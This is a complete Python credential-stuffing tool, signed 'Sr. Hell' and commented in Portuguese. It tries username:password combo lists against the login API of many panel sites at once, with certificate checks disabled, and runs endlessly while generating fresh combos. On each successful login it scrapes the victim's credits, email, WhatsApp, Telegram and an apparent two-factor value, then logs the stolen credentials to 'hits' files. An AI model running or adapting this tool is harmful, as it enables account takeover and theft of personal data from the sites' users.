import requests
import re
import sys
import logging
import os
import threading
import time
import queue
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style

# Configurações globais
THREADS_PER_SITE = 2
SIMULTANEOUS_SITES = 70
COMBO_GENERATION_INTERVAL = 3600  # Gerar novo combo a cada 1 hora

# Configuração para evitar warnings de SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
NOME = 'NPANEL UNIVERSAL'

if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f'\033]2;{NOME}\007')

ascii_art = """\033[93m
   _  _____  ___   _  ________     __  ___  __
  / |/ / _ \/ _ | / |/ / __/ /    / / / / |/ /
 /    / ___/ __ |/    / _// /__  / /_/ /    / 
/_/|_/_/  /_/ |_/_/|_/___/____/  \____/_/|_/  
                                              
"""

def login(nhost, user, password):
    url = f"https://{nhost}/sys/api.php"
    payload = {
        "action": "login",
        "username": user,
        "password": password
    }
    response = handle_connection_error(requests.post, url, data=payload, verify=False)
    
    if response and response.ok and "success\":true" in response.text:
        cookies = response.cookies.get("PHPSESSID")
        return cookies
    return None

def get_dashboard_data(nhost, cookies):
    url = f"https://{nhost}/dashboard"
    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies}, verify=False)
    return response.text if response else None

def get_profile_data(nhost, cookies):
    url = f"https://{nhost}/profile"
    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies}, verify=False)
    return response.text if response else None

def generate_new_combo():
    """Executa o script gerador de combos"""
    try:
        print(f"{Fore.CYAN}Gerando novo arquivo de combos...")
        subprocess.run([sys.executable, "gera.py"], check=True)
        print(f"{Fore.GREEN}Novo arquivo de combos gerado com sucesso!")
        return True
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Erro ao gerar novo arquivo de combos: {e}")
        return False

def get_first_combo_file():
    try:
        combo_dir = "/home/novidades/_Paineis/combo"
        combo_files = [f for f in os.listdir(combo_dir) if os.path.isfile(os.path.join(combo_dir, f))]
        if combo_files:
            return os.path.join(combo_dir, combo_files[0])
        return None
    except FileNotFoundError:
        print(f"{Fore.RED}Diretório de combo não encontrado!")
        return None

def read_sites():
    try:
        with open("/home/novidades/_Paineis/site.txt", "r") as f:
            return [site.strip() for site in f.readlines() if site.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Arquivo site.txt não encontrado!")
        return []

def handle_connection_error(func, *args, retries=3, delay=5, **kwargs):
    for attempt in range(retries):
        try:
            return func(*args, **kwargs)
        except (requests.ConnectionError, requests.Timeout) as e:
            print(f"{Fore.RED}Erro de conexão: {e}. Tentativa {attempt + 1} de {retries}...")
            time.sleep(delay)
    return None

def find_and_remove_existing_entry(filepath, user, password):
    """
    Finds and removes an existing entry for the given user/password combination.
    Returns True if entry was found and removed, False otherwise.
    """
    if not os.path.exists(filepath):
        return False
        
    try:
        with open(filepath, 'r') as f:
            content = f.read()
            
        # Create the pattern to match the entire entry block
        entry_pattern = (
            r"\n╼╾ Sr\. Hell ╼╾\n"
            r"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾\n"
            f"𝐔𝐒𝐄𝐑: {re.escape(user)}\n"
            f"𝐏𝐀𝐒𝐒: {re.escape(password)}\n"
            r"╼╾ 𝐢𝐧𝐟𝐨 ╼╾\n"
            r"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: .*?\n"
            r"╼╼╼╼╼╼╼╼╼╼╼\n"
            r"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n"
        )
        
        if re.search(entry_pattern, content):
            # Remove the existing entry
            new_content = re.sub(entry_pattern, '', content)
            with open(filepath, 'w') as f:
                f.write(new_content)
            return True
            
        return False
        
    except Exception as e:
        print(f"{Fore.RED}Erro ao procurar entrada existente: {str(e)}")
        return False

def remove_combo_entry(filepath, user, password):
    """Removes the user:password entry from the combo file if it exists."""
    if not os.path.exists(filepath):
        return
        
    try:
        with open(filepath, 'r') as f:
            lines = f.readlines()
            
        entry = f"{user}:{password}\n"
        if entry in lines:
            lines.remove(entry)
            
        with open(filepath, 'w') as f:
            f.writelines(lines)
            
    except Exception as e:
        print(f"{Fore.RED}Erro ao remover entrada do combo: {str(e)}")

def save_data(nhost, user, password, credits, email, registration_date, twofa, whatsapp, telegram):
    base_path = "/home/novidades/_Paineis/hits"
    os.makedirs(base_path, exist_ok=True)
    
    main_file = f"{base_path}/Sr.Hell@{nhost}.txt"
    combo_file = f"{base_path}/Sr.Hell@COMBO(U&P).txt"
    
    # Check and remove existing entries if found
    found = find_and_remove_existing_entry(main_file, user, password)
    if found:
        remove_combo_entry(combo_file, user, password)
    
    # Append the entry to the end of the files
    with open(main_file, "a") as f:
        f.write(f"\n╼╾ Sr. Hell ╼╾\n")
        f.write(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾\n")
        f.write(f"𝐔𝐒𝐄𝐑: {user}\n")
        f.write(f"𝐏𝐀𝐒𝐒: {password}\n")
        f.write(f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾\n")
        f.write(f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}\n")
        f.write(f"╼╼╼╼╼╼╼╼╼╼╼\n")
        f.write(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n")

    with open(combo_file, "a") as f:
        f.write(f"{user}:{password}\n")

def print_valid_login(nhost, user, password, credits):
    print(Fore.GREEN + f"\n╼╾ Sr. Hell ╼╾")
    print(Fore.GREEN + f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾")
    print(Fore.GREEN + f"𝐒𝐈𝐓𝐄: {nhost}")
    print(Fore.GREEN + f"𝐔𝐒𝐄𝐑: {user}")
    print(Fore.GREEN + f"𝐏𝐀𝐒𝐒: {password}")
    print(Fore.GREEN + f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾")
    print(Fore.GREEN + f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}")
    print(Fore.GREEN + f"╼╼╼╼╼╼╼╼╼╼╼")
    print(Fore.GREEN + f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾" + Style.RESET_ALL)

def thread_login(nhost, user, password):
    cookies = login(nhost, user, password)
    if cookies:
        dashboard_data = get_dashboard_data(nhost, cookies)
        profile_data = get_profile_data(nhost, cookies)

        credits = re.search(r'badge-info credits_badge\">Créditos: (\d+)', dashboard_data)
        credits = credits.group(1) if credits else "N/A"

        email = re.search(r'E-mail\" value=\"([^\"]+)\"', profile_data)
        email = email.group(1) if email else "N/A"

        registration_date = re.search(r'date_registered\" class=\"form-control\" value=\"([^\"]+)\"', profile_data)
        registration_date = registration_date.group(1) if registration_date else "N/A"

        whatsapp = re.search(r'name=\"whatsapp\" class=\"form-control\" placeholder=\"WhatsApp\" value=\"([^\"]+)\"', profile_data)
        whatsapp = whatsapp.group(1) if whatsapp else "N/A"

        telegram = re.search(r'name=\"telegram\" class=\"form-control\" placeholder=\"Telegram\" value=\"([^\"]+)\"', profile_data)
        telegram = telegram.group(1) if telegram else "N/A"

        twofa = re.search(r'<input type=\"text\" readonly class=\"form-control\" value=\"([^\"]+)\"', profile_data)
        twofa = twofa.group(1) if twofa else "N/A"

        save_data(nhost, user, password, credits, email, registration_date, twofa, whatsapp, telegram)
        print_valid_login(nhost, user, password, credits)
    else:
        print(f"{Fore.RED}Login falhou para [{user}]:[{password}] no site {nhost}")

def worker(combo_queue, nhost):
    while True:
        try:
            combo = combo_queue.get_nowait()
            if combo:
                user, password = combo.strip().split(':')
                thread_login(nhost, user, password)
        except queue.Empty:
            break
        except ValueError:
            continue
        finally:
            combo_queue.task_done()

def process_site(nhost, combos_data):
    print(f"{Fore.CYAN}Iniciando verificação do site: {nhost}")
    combo_queue = queue.Queue()
    for combo in combos_data:
        combo_queue.put(combo)

    threads = []
    for _ in range(THREADS_PER_SITE):
        t = threading.Thread(target=worker, args=(combo_queue, nhost))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
    print(f"{Fore.CYAN}Verificação concluída para o site: {nhost}")

def site_worker(site_queue, combos_data):
    while True:
        try:
            nhost = site_queue.get_nowait()
            if nhost:
                process_site(nhost, combos_data)
        except queue.Empty:
            break
        finally:
            site_queue.task_done()

def check_sites(sites, combos_data):
    site_queue = queue.Queue()
    for site in sites:
        site_queue.put(site)

    threads = []
    for _ in range(min(SIMULTANEOUS_SITES, len(sites))):
        t = threading.Thread(target=site_worker, args=(site_queue, combos_data))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def start_checking_process():
    while True:
        sites = read_sites()
        if not sites:
            print(f"{Fore.RED}Nenhum site encontrado para verificar!")
            time.sleep(60)
            continue

        combo_file = get_first_combo_file()
        if not combo_file:
            print(f"{Fore.RED}Nenhum arquivo de combo encontrado!")
            time.sleep(60)
            continue

        print(f"{Fore.CYAN}Usando arquivo de combo: {os.path.basename(combo_file)}")
        print(f"{Fore.CYAN}Sites a serem verificados: {len(sites)}")
        
        try:
            with open(combo_file, "r") as f:
                combos_data = f.readlines()
            print(f"{Fore.CYAN}Combos carregados: {len(combos_data)}")
            
            check_sites(sites, combos_data)
            
            # Gera novo combo após terminar a verificação
            generate_new_combo()
            time.sleep(5)  # Pequena pausa antes de recomeçar
            
        except Exception as e:
            print(f"{Fore.RED}Erro durante a verificação: {str(e)}")
            time.sleep(60)

def main():
    print(ascii_art)
    print(f"{Fore.CYAN}Iniciando verificação contínua...")
    print(f"{Fore.CYAN}Threads por site: {THREADS_PER_SITE}")
    print(f"{Fore.CYAN}Sites simultâneos: {SIMULTANEOUS_SITES}")
    
    while True:  # Loop infinito para reiniciar o processo
        try:
            # Gera o primeiro combo antes de começar
            generate_new_combo()
            time.sleep(5)  # Aguarda um pouco para o arquivo ser criado
            
            # Inicia o processo de verificação contínua
            start_checking_process()
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Operação interrompida pelo usuário.")
            sys.exit(0)  # Sai do programa se o usuário interromper
        except Exception as e:
            print(f"{Fore.RED}Erro fatal: {str(e)}")
            print(f"{Fore.YELLOW}Reiniciando o processo em 60 segundos...")
            time.sleep(60)  # Aguarda 60 segundos antes de reiniciar em caso de erro
            # O loop while True fará com que o processo recomece automaticamente

if __name__ == "__main__":
    main()